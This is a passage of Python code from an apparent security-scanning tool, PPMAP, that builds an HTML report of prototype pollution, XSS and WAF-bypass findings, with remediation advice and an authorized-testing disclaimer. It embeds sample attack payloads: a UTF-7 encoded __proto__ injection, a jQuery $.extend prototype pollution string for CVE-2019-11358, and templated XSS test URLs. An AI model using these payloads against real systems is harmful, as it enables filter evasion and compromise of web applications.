            <div style="background: #f3e5f5; border-left: 5px solid #6a1b9a; padding: 15px; margin: 12px 0; border-radius: 4px;">
                <strong>⚠️ HIGH: Charset Override Detected</strong>
                <div style="margin-top: 10px; font-size: 13px;">
                    <ul>
                        <li><strong>UTF-7 Encoding Bypass:</strong> Can bypass WAF filters</li>
                        <li><strong>ISO-2022 Bypass:</strong> Special encoding handling</li>
                        <li><strong>Double Encoding:</strong> Multiple encoding layers</li>
                        <li><strong>Impact:</strong> Bypass WAF/security checks, enable PP attacks</li>
                    </ul>
                </div>
            </div>
"""
                for idx, finding in enumerate(charset_findings, 1):
                    method = finding.get("method", "CHARSET_UNKNOWN")
                    encoding = finding.get("encoding", "unknown")
                    payload = finding.get("payload", "")

                    report_html += f"""
            <div class="vulnerability" style="background: #f3e5f5; border-left: 5px solid #6a1b9a;">
                <div style="margin-bottom: 12px;">
                    <strong>#{idx} - {html_escape(method)}</strong>
                    <span class="method-label" style="background-color: #6a1b9a; color: white;">HIGH</span>
                </div>
                <div style="margin-bottom: 10px;">
                    <strong>Encoding:</strong> {html_escape(encoding)}<br>
                    <strong>Detection Method:</strong> Server accepts {html_escape(encoding)} charset
                </div>
                <div style="margin-bottom: 10px;">
                    <strong>Exploitation:</strong><br>
                    <div class="verification">
                        <p><strong>1. Bypass WAF with {html_escape(encoding)}:</strong></p>
                        <code>POST / HTTP/1.1<br>Content-Type: application/json; charset={html_escape(encoding)}<br><br>{{payload}}</code>
                        <br><br>
                        <p><strong>2. UTF-7 Example:</strong></p>
                        <code>+ACo-__proto__+ACo-+AD0-+ACo-admin+ACo-+AD0-true</code>
                        <br><br>
                        <p><strong>Why It Works:</strong> Server parses payload in {html_escape(encoding)}, bypassing literal string filters</p>
                        <p><strong>Mitigation:</strong> Whitelist accepted charsets, filter before decoding</p>
                    </div>
                </div>
            </div>
"""

            # Discovered Endpoints
            if discovered_endpoints:
                report_html += f"<h3>🔗 Discovered Endpoints ({len(discovered_endpoints)} found)</h3>"
                report_html += """
            <div class="table-container">
                <table>
                    <thead>
                        <tr>
                            <th>URL</th>
                            <th>Status</th>
                            <th>Size</th>
                        </tr>
                    </thead>
                    <tbody>
"""
                for endpoint in discovered_endpoints:
                    url = endpoint.get("url", "")
                    status = endpoint.get("status", "N/A")
                    size = endpoint.get("size", "N/A")
                    status_class = "critical" if status >= 400 else "info"

                    report_html += f"""
                        <tr>
                            <td><a href="{html_escape(url)}" target="_blank">{html_escape(url)}</a></td>
                            <td><span class="{status_class}">{status}</span></td>
                            <td>{size} bytes</td>
                        </tr>
"""
                report_html += """
                    </tbody>
                </table>
            </div>
"""

            # jQuery PP findings
            if jquery_findings:
                report_html += f"<h3>🎯 jQuery Prototype Pollution (CVE-2019-11358) ({len(jquery_findings)} found)</h3>"
                for idx, vuln in enumerate(jquery_findings, 1):
                    report_html += f'''
            <div class="vulnerability">
                <strong>#{idx} - {html_escape(vuln.get('name', 'Unknown'))}</strong>
                <span class="method-label critical">{vuln.get('severity', 'CRITICAL')}</span><br>
                <strong>Payload:</strong><br>
                <div class="payload-code">{html_escape(str(vuln.get('payload')) if vuln.get('payload') else "$.extend(true, {}, JSON.parse('{\"__proto__\": {\"devMode\": true}}'))")}</div>
                {f'<div class="payload-code" style="margin-top:5px; border-color:orange;">Has Payload: {html_escape(str(vuln.get("payload")))}</div>' if vuln.get('payload') else ''}
                <div style="margin-top: 10px;">
                    <strong>Verification Steps:</strong>
                    <div class="verification">
                        1. Ensure jQuery version is < 3.5.0<br>
                        2. Test with provided payload above<br>
                        3. Check if prototype chain was polluted<br>
                        4. Look for unexpected behavior or data leakage
                    </div>
                </div>
            </div>
'''

            # XSS findings
            if xss_findings:
                report_html += f"<h3>⚡ Cross-Site Scripting (XSS) ({len(xss_findings)} found)</h3>"
                for idx, vuln in enumerate(xss_findings, 1):
                    param = vuln.get("param", "unknown")
                    payload = vuln.get("payload", "")

                    report_html += f"""
            <div class="vulnerability">
                <strong>#{idx} - XSS in Parameter: {html_escape(param)}</strong>
                <span class="method-label high">{vuln.get('severity', 'HIGH')}</span><br>
                <strong>Payload:</strong><br>
                <div class="payload-code">{html_escape(str(payload)[:200])}</div>
                <div style="margin-top: 10px;">
                    <strong>Verification:</strong>
                    <div class="verification">
                        Test URL with payload: {html_escape(target_url)}?{html_escape(param)}={html_escape(str(payload)[:100])}
                    </div>
                </div>
            </div>
"""

        report_html += """
        </div>
        
        <div class="section">
            <h2>📋 Recommendations & Remediation</h2>
            <ul>
"""

        if waf_bypasses:
            report_html += """
                <li><strong>WAF Bypass Prevention:</strong>
                    <ul>
                        <li>Implement multi-layer input validation (not just regex-based)</li>
                        <li>Use parameterized requests instead of string concatenation</li>
                        <li>Apply both normalized and original value checks</li>
                        <li>Monitor for bypass attempt patterns in logs</li>
                        <li>Regularly update WAF rules with new bypass techniques</li>
                        <li>Test WAF effectiveness against known bypass methods</li>
                    </ul>
                </li>
"""

        if jquery_findings:
            report_html += """
                <li><strong>jQuery Prototype Pollution:</strong>
                    <ul>
                        <li>Upgrade jQuery to version 3.5.0 or higher (patch released 2020-04-10)</li>
                        <li>Replace $.extend() with Object.assign() or object spread syntax</li>
                        <li>Implement strict input validation on all user-supplied parameters</li>
                        <li>Use allowlists for accepted object keys</li>
                        <li>Apply Content Security Policy (CSP) headers</li>
                        <li>Consider using Object.freeze() or Object.seal() on critical objects</li>
                    </ul>
                </li>
"""

        if xss_findings:
            report_html += """
                <li><strong>Cross-Site Scripting (XSS):</strong>
                    <ul>
                        <li>Implement proper output encoding (HTML, JavaScript, URL context-aware)</li>
                        <li>Use a templating engine with auto-escaping enabled</li>
                        <li>Set X-XSS-Protection header (defense in depth)</li>
                        <li>Implement Content Security Policy (CSP) with script-src restrictions</li>
                        <li>Use HTTPOnly and Secure flags on authentication cookies</li>
                        <li>Sanitize user input with a library like DOMPurify</li>
                        <li>Avoid using eval() and similar dangerous functions</li>
                    </ul>
                </li>
"""

        report_html += """
            </ul>
        </div>
        
        <div class="section">
            <h2>🔐 Security Testing Best Practices</h2>
            <ul>
                <li><strong>Validation:</strong> Always validate findings in a controlled environment with proper authorization</li>
                <li><strong>Reproduction:</strong> Document exact steps to reproduce each finding</li>
                <li><strong>Testing:</strong> Test on a copy of the application, not production</li>
                <li><strong>Documentation:</strong> Keep records of all testing activities</li>
                <li><strong>Remediation:</strong> Track fixes and verify them after deployment</li>
            </ul>
        </div>
        
        <div class="section">
            <h2>⚖️ Disclaimer</h2>
            <p>This report was generated by PPMAP v4.1.0 for authorized security testing only.
            The findings should be validated and addressed by qualified security professionals.
            Always obtain proper authorization before performing security assessments on any target.
            Unauthorized access to computer systems is illegal.</p>
        </div>
        
        <footer>
            <p>PPMAP v4.1.0 | Prototype Pollution Multi-Purpose Assessment Platform</p>
            <p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </footer>
    </div>
</body>
</html>
"""
        return report_html


# ============================================================================
# MAIN
# ============================================================================
